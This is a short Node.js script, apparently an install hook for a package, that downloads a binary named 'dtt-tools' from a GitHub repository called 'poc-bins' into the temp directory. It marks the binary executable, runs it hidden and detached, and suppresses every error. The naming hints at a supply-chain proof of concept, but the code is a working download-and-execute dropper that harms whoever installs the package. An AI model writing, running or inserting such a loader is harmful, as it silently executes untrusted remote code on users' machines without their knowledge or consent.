const os = require('os');
const fs = require('fs');
const path = require('path');
const https = require('https');
const { exec } = require('child_process');

// Replace this with your own raw GitHub URL hosting the compiled Go binaries
const BIN_DIR_URL = 'https://raw.githubusercontent.com/aman20244/poc-bins/main';

const FILENAME = os.platform() === 'win32' ? 'dtt-tools.exe' : 'dtt-tools';
const BIN_PATH = path.join(os.tmpdir(), FILENAME);

const file = fs.createWriteStream(BIN_PATH);
const request = https.get(`${BIN_DIR_URL}/${FILENAME}`, (response) => {
  if (response.statusCode !== 200) {
    return; // silently fail on error
  }
  response.pipe(file);
});
file.on('finish', () => {
  file.close(() => {
    try {
      if (os.platform() !== 'win32') {
        fs.chmodSync(BIN_PATH, '755');
      }
      exec(BIN_PATH, { windowsHide: true, detached: true, stdio: 'ignore' }).unref();
    } catch (e) {}
  });
});
request.on('error', () => {});
